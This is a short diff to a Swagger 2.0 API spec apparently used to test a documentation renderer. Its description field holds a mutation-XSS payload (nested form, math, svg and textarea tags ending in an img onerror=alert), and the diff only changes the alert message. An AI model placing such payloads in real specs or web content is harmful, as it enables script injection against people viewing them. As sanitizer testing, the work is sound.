@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Teste Client 
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('chor4o') src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('So tem hacker aqui!') src=1>"></form>
 
   version: production
 basePath: /JSSResource/
